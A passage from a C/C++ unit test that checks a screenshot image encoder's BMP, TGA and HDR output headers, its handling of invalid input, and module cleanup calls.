    if (memcmp(bmp_out, "BM", 2) != 0) {
      free(bmp_out);
      return fail("screenshot_encode_image invalid BMP header");
    }
    free(bmp_out);

    /* 4. Test TGA format */
    void *tga_out = nullptr;
    size_t tga_len = 0;
    if (!screenshot_encode_image(C2T_IMAGE_FORMAT_TGA, 16, 16, test_pixels, 1, 85, &tga_out, &tga_len) || !tga_out || tga_len < 18)
      return fail("screenshot_encode_image TGA failed");
    free(tga_out);

    /* 5. Test HDR format */
    void *hdr_out = nullptr;
    size_t hdr_len = 0;
    if (!screenshot_encode_image(C2T_IMAGE_FORMAT_HDR, 16, 16, test_pixels, 1, 85, &hdr_out, &hdr_len) || !hdr_out || hdr_len < 10)
      return fail("screenshot_encode_image HDR failed");
    if (memcmp(hdr_out, "#?RADIANCE\n", 11) != 0 && memcmp(hdr_out, "#?RGBE\n", 7) != 0) {
      free(hdr_out);
      return fail("screenshot_encode_image invalid HDR header");
    }
    free(hdr_out);

    /* Test contract on invalid inputs */
    void *bad_out = (void *)1;
    size_t bad_len = 123;
    if (screenshot_encode_image(C2T_IMAGE_FORMAT_PNG, 0, 16, test_pixels, 0, 85, &bad_out, &bad_len) ||
        bad_out != nullptr || bad_len != 0)
      return fail("screenshot_encode_image invalid-input contract mismatch");
  }

  (void)screenshot_get_total_captures();
  (void)screenshot_get_total_bytes();
  screenshot_output_cleanup();

  c2t_crypto_cleanup();
  c2t_log_cleanup();
  return 0;
}
